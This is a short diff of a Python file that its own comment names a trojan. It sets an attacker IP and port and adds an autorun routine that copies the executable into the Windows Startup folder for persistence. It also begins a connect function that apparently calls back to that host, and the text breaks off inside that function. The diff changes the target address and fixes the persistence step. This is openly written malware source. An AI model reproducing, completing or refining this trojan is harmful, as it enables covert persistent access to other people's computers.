@@ -4,14 +4,14 @@ import subprocess
 import threading
 import os
 
-IP = "192.x.x.x" # change it!!
+IP = "10.0.2.5" # change it!!
 PORT = 443 # change it?
 
 # Copy the trojan to the startup folder on Windows
 def autorun():
     filename = os.path.basename(__file__)
     exe_filename = filename.replace(".py", ".exe")
-    os.system(f"copy {filename} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programas\\Startup\"")
+    os.system(f"copy {exe_filename} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programas\\Startup\"")
 
 def connect(IP,PORT):
     try:
